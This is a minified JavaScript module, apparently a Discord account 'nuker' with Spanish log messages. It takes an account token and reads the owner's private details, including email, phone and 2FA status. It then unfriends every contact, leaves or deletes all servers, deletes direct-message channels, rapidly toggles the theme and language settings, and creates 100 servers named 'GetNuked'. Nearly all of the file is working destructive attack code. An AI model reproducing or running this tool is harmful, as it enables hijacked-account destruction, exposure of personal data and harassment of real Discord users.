const{Color:Color}=require("./dsg"),Axios=require("axios").default;class User extends Color{constructor({token:e}){super(),this.token=e,this.headers={info:{"Content-Type":"application/json",Authorization:this.token},nuke:{Authorization:this.token,"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36"}}}async info(){try{const e=(await Axios.get("https://discord.com/api/v8/users/@me",{headers:this.headers.info})).data,a="https://cdn.discordapp.com/avatars/";return[`Tag      |   ${e.username+"#"+e.discriminator}`,`Email    |   ${e.email||"None"}`,`2FA      |   ${e.mfa_enabled}`,`Phone    |   ${e.phone||"None"}`,`ID       |   ${e.id}`,`Lenguaje |   ${e.locale}`,`Verificad|   ${e.verified}`,`Flags    |   All: ${e.flags} | Private: ${e.public_flags}`,`NSFW     |   ${e.nsfw_allowed}`,`Avatar   |   ${a+`${e.id}/${e.avatar}.jpg`}`]}catch(e){throw e}}async nuke(){const e="https://discord.com/api/v8",a=(await Axios.get(e+"/users/@me",{headers:this.headers.info})).status;if(200!==a)throw new Error("Request fallido! "+a);await Axios({method:"GET",url:e+"/users/@me/relationships",headers:this.headers.nuke}).then(a=>{const s=[];a.data.forEach(e=>{s.push({id:e.id,tag:e.user.username+"#"+e.user.discriminator})}),s.forEach(a=>{Axios.delete(e+`/users/@me/relationships/${a.id}`,{headers:this.headers.nuke}).then(()=>Color.log(`Unfriended ${a.tag}`)).catch(e=>{Color.log(e,">",0)})})}).catch(e=>{Color.log(e,">",0)}),await Axios({method:"GET",url:e+"/users/@me/guilds",headers:this.headers.nuke}).then(a=>{const s={true:[],false:[]};a.data.forEach(e=>{0==e.owner?s.false.push({id:e.id,name:e.name}):s.true.push({id:e.id,name:e.name})}),s.false.forEach(a=>{Axios.delete(e+`/users/@me/guilds/${a.id}`,{headers:this.headers.nuke}).then(()=>Color.log(`Sali del servidor: ${a.name}`)).catch(e=>{Color.log(e,">",0)})}),s.true.forEach(a=>{Axios({method:"POST",url:e+`/guilds/${a.id}/delete`,headers:this.headers.nuke}).then(()=>Color.log(`Servidor eliminado: ${a.name}`)).catch(e=>{Color.log(e,">",0)})})}).catch(e=>{Color.log(e,">",0)}),await Axios({method:"GET",url:e+"/users/@me/channels",headers:this.headers.nuke}).then(a=>{const s=[];a.data.forEach(e=>{s.push(e.id)}),s.forEach(a=>{Axios.delete(e+`/channels/${a}`,{headers:this.headers.nuke})})}).catch(e=>{Color.log(e,">",0)}),setInterval(async()=>{await Axios({method:"PATCH",url:e+"/users/@me/settings",headers:this.headers.nuke,data:{theme:this.random(["light","dark"]),locale:this.random(["ja","zh-TW","ko","zh-CN","de","lt","lv","fi","se"])}}).catch(e=>{Color.log(e,">",0)})},100);for(var s=1;s<101;s++)await Axios({method:"POST",url:e+"/guilds",headers:this.headers.nuke,data:{name:"GetNuked",region:"brazil",icon:null,channels:null}}).then(()=>{Color.log(`Guild creado #(${s})`)}).catch(e=>{Color.log(e,">",0)})}random(e=[]){return e[Math.floor(Math.random()*e.length)]}}module.exports.User=User;
